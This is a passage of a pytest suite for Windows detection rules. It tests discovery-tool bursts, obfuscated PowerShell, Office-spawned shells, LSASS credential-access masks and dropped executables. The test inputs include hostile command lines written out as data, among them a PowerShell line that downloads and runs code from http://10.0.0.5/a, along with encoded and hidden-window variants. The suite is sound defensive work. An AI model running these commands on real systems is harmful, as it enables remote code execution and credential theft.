    inside = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe"),
        _proc(2, 1, image="C:\\Windows\\System32\\net.exe"),
        _proc(3, DISCOVERY_WINDOW_SECONDS, image="C:\\Windows\\System32\\route.exe"),
    ]
    assert len(run_rule("R-EXEC-01", inside)) == 1
    outside = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe"),
        _proc(2, 1, image="C:\\Windows\\System32\\net.exe"),
        _proc(3, DISCOVERY_WINDOW_SECONDS + 1, image="C:\\Windows\\System32\\route.exe"),
    ]
    assert [detection.severity for detection in run_rule("R-EXEC-01", outside)] == ["low", "low", "low"]


def test_a_burst_does_not_span_two_accounts():
    events = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe", user="alice"),
        _proc(2, 1, image="C:\\Windows\\System32\\net.exe", user="bob"),
        _proc(3, 2, image="C:\\Windows\\System32\\route.exe", user="carol"),
    ]
    detections = run_rule("R-EXEC-01", events)
    assert [detection.severity for detection in detections] == ["low", "low", "low"]


def test_an_ordinary_binary_is_not_discovery_telemetry():
    events = [_proc(1, 0, image="C:\\Windows\\System32\\svchost.exe"), _proc(2, 1, image=CMD)]
    assert run_rule("R-EXEC-01", events) == ()


def test_sysmon_process_creation_can_also_supply_discovery_events():
    events = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe", channel=SYSMON),
        _proc(2, 1, image="C:\\Windows\\System32\\net1.exe", channel=SYSMON),
        _proc(3, 2, image="C:\\Windows\\System32\\nltest.exe", channel=SYSMON),
    ]
    detections = run_rule("R-EXEC-01", events)
    assert len(detections) == 1
    assert detections[0].trigger_evidence_ids == ("SYN-B-SYS-1", "SYN-B-SYS-2", "SYN-B-SYS-3")


def test_a_burst_after_a_stray_early_binary_still_fires():
    # Phase-3 F1: whoami at 0 s is 100 s before the first of the three binaries that really are
    # a burst. A cluster anchored at whoami would pair it with net and stop; a sliding window
    # starts a fresh candidate at net and finds the burst. (Reviewer's reproduction case.)
    events = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe"),
        _proc(2, 100, image="C:\\Windows\\System32\\net.exe"),
        _proc(3, 130, image="C:\\Windows\\System32\\ipconfig.exe"),
        _proc(4, 140, image="C:\\Windows\\System32\\systeminfo.exe"),
    ]
    detections = run_rule("R-EXEC-01", events)
    assert [detection.severity for detection in detections] == ["low", "medium"]
    burst = detections[1]
    assert burst.trigger_evidence_ids == ("SYN-B-SEC-2", "SYN-B-SEC-3", "SYN-B-SEC-4")
    assert detections[0].trigger_evidence_ids == ("SYN-B-SEC-1",)
    assert "ipconfig" in burst.rationale and "systeminfo" in burst.rationale


def test_binaries_that_never_share_a_window_are_single_hits():
    # Benign counterpart: two distinct binaries on each side of a gap wider than the window are
    # not an enumeration burst, so each stays a low single hit.
    events = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe"),
        _proc(2, 10, image="C:\\Windows\\System32\\net.exe"),
        _proc(3, 400, image="C:\\Windows\\System32\\ipconfig.exe"),
        _proc(4, 410, image="C:\\Windows\\System32\\systeminfo.exe"),
    ]
    detections = run_rule("R-EXEC-01", events)
    assert [detection.severity for detection in detections] == ["low", "low", "low", "low"]


def test_two_adjacent_bursts_are_two_disjoint_medium_detections():
    # A window that qualifies consumes its own events, so the next burst is found from the next
    # unconsumed binary and no trigger belongs to two detections.
    events = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe"),
        _proc(2, 10, image="C:\\Windows\\System32\\net.exe"),
        _proc(3, 20, image="C:\\Windows\\System32\\ipconfig.exe"),
        _proc(4, 130, image="C:\\Windows\\System32\\arp.exe"),
        _proc(5, 140, image="C:\\Windows\\System32\\route.exe"),
        _proc(6, 150, image="C:\\Windows\\System32\\tasklist.exe"),
    ]
    detections = run_rule("R-EXEC-01", events)
    assert [detection.severity for detection in detections] == ["medium", "medium"]
    assert [detection.trigger_evidence_ids for detection in detections] == [
        ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3"),
        ("SYN-B-SEC-4", "SYN-B-SEC-5", "SYN-B-SEC-6"),
    ]


@pytest.mark.parametrize(
    ("image", "technique"),
    (
        ("C:\\Windows\\System32\\whoami.exe", "T1033"),
        ("C:\\Windows\\System32\\systeminfo.exe", "T1082"),
        ("C:\\Windows\\System32\\ipconfig.exe", "T1016"),
    ),
)
def test_a_discovery_single_hit_carries_the_technique_of_its_own_binary(image: str, technique: str):
    # Phase-3 F2: the rule used to tag every hit T1033, including systeminfo (T1082) and
    # ipconfig (T1016).
    detections = run_rule("R-EXEC-01", [_proc(1, 0, image=image)])
    assert len(detections) == 1
    assert detections[0].attack_technique == technique


def test_the_discovery_technique_map_covers_exactly_the_discovery_binaries():
    assert set(DISCOVERY_TECHNIQUES) == set(DISCOVERY_BINARIES)
    for stem, technique in DISCOVERY_TECHNIQUES.items():
        assert re.fullmatch(r"T[0-9]{4}(\.[0-9]{3})?", technique), (stem, technique)
    assert DISCOVERY_TECHNIQUES["whoami"] == "T1033"
    assert DISCOVERY_TECHNIQUES["systeminfo"] == "T1082"
    assert DISCOVERY_TECHNIQUES["ipconfig"] == "T1016"


def test_a_discovery_burst_is_tagged_with_its_first_binary_and_names_every_technique():
    events = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe"),
        _proc(2, 5, image="C:\\Windows\\System32\\ipconfig.exe"),
        _proc(3, 10, image="C:\\Windows\\System32\\systeminfo.exe"),
    ]
    (burst,) = run_rule("R-EXEC-01", events)
    assert burst.severity == "medium"
    # The documented rule for a multi-binary burst: the field carries the first trigger's
    # binary's technique, and the rationale names every technique the burst covers.
    assert burst.attack_technique == "T1033"
    for technique in ("T1033", "T1016", "T1082"):
        assert technique in burst.rationale


# --- R-EXEC-02 ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "command_line",
    (
        "powershell.exe -enc SQBFAFgA",
        "powershell.exe -EncodedCommand SQBFAFgA",
        'powershell.exe -nop -w hidden -Command "Get-Date"',
        "powershell.exe -WindowStyle Hidden -Command Get-Date",
        "powershell.exe -Command [System.Convert]::FromBase64String($x)",
        "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a')",
        "pwsh.exe -enc SQBFAFgA",
    ),
)
def test_a_marked_powershell_command_line_is_a_high_detection(command_line: str):
    event = _proc(1, 0, image=POWERSHELL, command_line=command_line)
    detections = run_rule("R-EXEC-02", [event])
    assert len(detections) == 1
    assert detections[0].severity == "high"
    assert detections[0].trigger_evidence_ids == ("SYN-B-SEC-1",)


@pytest.mark.parametrize(
    "command_line",
    (
        "powershell.exe -File script.ps1",
        "powershell.exe -Encoding UTF8 -File script.ps1",
        "powershell.exe -ExecutionPolicy Bypass -File deploy.ps1",
        "powershell.exe -Command Get-ChildItem -Path C:\\Windows",
        "cmd.exe /c ipconfig /all",
        "net.exe use \\\\server\\share",
    ),
)
def test_an_ordinary_command_line_does_not_fire_the_powershell_rule(command_line: str):
    event = _proc(1, 0, image=POWERSHELL, command_line=command_line)
    assert run_rule("R-EXEC-02", [event]) == ()


def test_a_non_process_event_with_a_marked_command_line_is_ignored():
    event = _auth(1, 4624, 0)
    event = event.model_copy(update={"event_data": {"CommandLine": "powershell.exe -enc SQBFAFgA"}})
    assert run_rule("R-EXEC-02", [event]) == ()


def test_the_marked_command_line_must_be_powershell():
    events = [_proc(1, 0, image=CMD, command_line="cmd.exe /c tool.exe -enc abc")]
    assert run_rule("R-EXEC-02", events) == ()


# --- R-EXEC-03 ---------------------------------------------------------------------


def test_a_document_host_spawning_a_shell_is_a_high_detection():
    event = _proc(1, 0, image=CMD, parent=WINWORD)
    detections = run_rule("R-EXEC-03", [event])
    assert len(detections) == 1
    assert detections[0].severity == "high"
    assert "WINWORD.EXE" in detections[0].rationale


def test_a_parent_shell_detection_records_both_techniques():
    # Phase-3 F2: the artefact field carries the primary T1204 (user execution) and the
    # rationale names the secondary T1059 (command and scripting interpreter) as well.
    (detection,) = run_rule("R-EXEC-03", [_proc(1, 0, image=CMD, parent=WINWORD)])
    assert detection.attack_technique == "T1204"
    assert "T1204" in detection.rationale
    assert "T1059" in detection.rationale


def test_a_wmi_host_spawning_a_script_engine_is_a_detection():
    event = _proc(
        1,
        0,
        image="C:\\Windows\\System32\\WScript.exe",
        parent="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    )
    assert len(run_rule("R-EXEC-03", [event])) == 1


def test_sysmon_process_creation_supplies_parent_and_child_images():
    event = _proc(1, 0, image="C:\\Windows\\System32\\regsvr32.exe", parent=WINWORD, channel=SYSMON)
    assert len(run_rule("R-EXEC-03", [event])) == 1


@pytest.mark.parametrize(
    ("parent", "child"),
    (
        (EXPLORER, CMD),
        (WINWORD, EXPLORER),
        (CMD, POWERSHELL),
        ("C:\\Windows\\System32\\services.exe", "C:\\Windows\\System32\\svchost.exe"),
    ),
)
def test_an_ordinary_parent_child_pair_does_not_fire(parent: str, child: str):
    assert run_rule("R-EXEC-03", [_proc(1, 0, image=child, parent=parent)]) == ()


# --- R-CRED-01 ---------------------------------------------------------------------


def test_a_documented_suspicious_mask_against_lsass_is_a_high_detection():
    events = [
        _sysmon(1, 10, 0, event_data={"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x001410"}),
        _sysmon(
            2,
            10,
            5,
            event_data={
                "TargetImage": "C:\\Windows\\System32\\LSASS.EXE",
                "GrantedAccess": "0x001FFFFF",
            },
        ),
    ]
    detections = run_rule("R-CRED-01", events)
    assert [detection.trigger_evidence_ids for detection in detections] == [("SYN-B-SYS-1",), ("SYN-B-SYS-2",)]
    assert {detection.severity for detection in detections} == {"high"}
    assert {detection.attack_technique for detection in detections} == {"T1003.001"}


@pytest.mark.parametrize(
    "event_data",
    (
        {"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x001000"},
        {"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x00000010"},
        {"TargetImage": "C:\\Windows\\System32\\notepad.exe", "GrantedAccess": "0x001FFFFF"},
        {"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0xZZZZ"},
        {"TargetImage": "C:\\Windows\\System32\\lsass.exe"},
    ),
)
def test_a_benign_or_unparseable_process_access_is_not_a_credential_theft_hit(event_data: dict[str, str]):
    assert run_rule("R-CRED-01", [_sysmon(1, 10, 0, event_data=event_data)]) == ()


def test_a_security_event_that_mimics_process_access_does_not_fire():
    events = [_event(1, 4688, event_data={"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010"})]
    assert run_rule("R-CRED-01", events) == ()


# --- R-FILE-01 ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "target",
    (
        "C:\\Users\\alice\\AppData\\Local\\Temp\\evil.exe",
        "C:\\Users\\alice\\AppData\\Roaming\\payload.dll",
        "C:\\Users\\bob\\Downloads\\invoice.ps1",
        "C:\\Windows\\Temp\\stage.bat",
        "C:\\ProgramData\\tools\\update.vbs",
        "C:\\Users\\alice\\AppData\\Local\\Temp\\helper.js",
    ),
)
def test_an_executable_written_to_a_user_writable_location_is_a_detection(target: str):
    detections = run_rule("R-FILE-01", [_sysmon(1, 11, 0, event_data={"TargetFilename": target})])
    assert len(detections) == 1
    assert detections[0].severity == "medium"
    assert detections[0].attack_technique == "T1105"


@pytest.mark.parametrize(
    "target",
    (
        "C:\\Windows\\System32\\driver.dll",
        "C:\\Windows\\Temp\\notes.txt",
        "C:\\Users\\alice\\Documents\\report.exe",
        "C:\\Users\\alice\\AppData\\Local\\Temp\\archive.zip",
        "C:\\ProgramData\\Microsoft\\Windows Defender\\Definitions\\mpasbase.vdm",
    ),
)
def test_an_ordinary_file_creation_is_not_a_drop(target: str):
    assert run_rule("R-FILE-01", [_sysmon(1, 11, 0, event_data={"TargetFilename": target})]) == ()


def test_a_missing_target_filename_does_not_fire():
    assert run_rule("R-FILE-01", [_sysmon(1, 11, 0, event_data={"Image": EXPLORER})]) == ()


# --- cross-rule properties ---------------------------------------------------------


def every_suspicious_event() -> tuple[NormalisedEvent, ...]:
    return (
        _auth(1, 4625, 0),
        _auth(2, 4625, 10),
        _auth(3, 4625, 20),
        _auth(4, 4624, 30),
        _auth(5, 4648, 40),
        _event(6, 1102, user=None, event_data={}),
        _event(7, 4697, event_data={"ServiceName": "EvilSvc"}),
        _event(8, 4698, event_data={"TaskName": "\\Evil"}),
        _sysmon(9, 13, 50, event_data={"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\X"}),
        _proc(10, 60, image="C:\\Windows\\System32\\whoami.exe"),
        _proc(11, 61, image="C:\\Windows\\System32\\net.exe"),
        _proc(12, 62, image="C:\\Windows\\System32\\tasklist.exe"),
        _proc(13, 70, image=POWERSHELL, command_line="powershell.exe -enc SQBFAFgA"),
        _proc(14, 80, image=CMD, parent=WINWORD),
        _sysmon(15, 10, 90, event_data={"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010"}),
        _sysmon(16, 11, 100, event_data={"TargetFilename": "C:\\Windows\\Temp\\stage.exe"}),
        # A second burst for another account, with no successful logon after it (R-AUTH-02).
        _auth(17, 4625, 200, user="bob"),
        _auth(18, 4625, 205, user="bob"),
        _auth(19, 4625, 210, user="bob"),
    )


def test_the_whole_catalogue_gives_unique_ids_and_a_trigger_per_detection():
    versions = {rule.spec.rule_id: rule.spec.version for rule in RULES}
    detections = [detection for rule in RULES for detection in rule.fn(every_suspicious_event())]
    ids = [detection.detection_id for detection in detections]
    assert len(set(ids)) == len(ids)
    assert len(detections) >= len(RULES)
    for detection in detections:
        assert detection.scenario_id == SCENARIO
        assert detection.trigger_evidence_ids
        assert detection.rule_id in versions
        assert detection.rationale
        assert detection.rule_version == versions[detection.rule_id]
    # And no rule fires on the empty scenario.
    for rule in RULES:
        assert rule.fn(()) == (), rule.spec.rule_id


def test_rules_never_fire_twice_on_the_same_trigger_event():
    for rule in RULES:
        detections = rule.fn(every_suspicious_event())
        triggers = [evidence_id for detection in detections for evidence_id in detection.trigger_evidence_ids]
        assert len(triggers) == len(set(triggers)), rule.spec.rule_id
